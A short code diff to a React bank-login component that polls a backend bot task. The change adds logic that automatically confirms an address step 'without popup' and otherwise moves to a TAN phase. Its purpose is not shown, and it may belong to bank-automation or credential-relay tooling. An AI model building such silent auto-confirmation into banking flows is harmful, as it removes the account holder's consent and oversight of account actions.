@@ -389,9 +389,27 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         return;
       }
 
+      // Auto-confirm address without popup
+      const addressConfirmSignal =
+        st === "waiting_for_address_confirm" ||
+        st === "waiting_for_address" ||
+        payloadContains(data, /address.?confirm|adress.?bestaet|waiting_for_address/i);
+      if (addressConfirmSignal) {
+        pollRef.current.positiveSeen = true;
+        setPhase("address_confirm");
+        setSubmitting(true);
+        if (!(pollRef.current as any).addressConfirmed) {
+          (pollRef.current as any).addressConfirmed = true;
+          confirmAddress(taskId).catch((e) => console.warn("[bot] confirm-address failed", e));
+        }
+        pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
+        return;
+      }
+
       if (st === "waiting_for_tan" || tanRequired || loginValidated || looksLikeSecureGo || tanConfirmedSignal) {
         setPhase("tan");
         setSubmitting(false);
+
       } else if (st === "running" || st === "pending") {
         setSubmitting(true);
       } else if (st === "failed") {
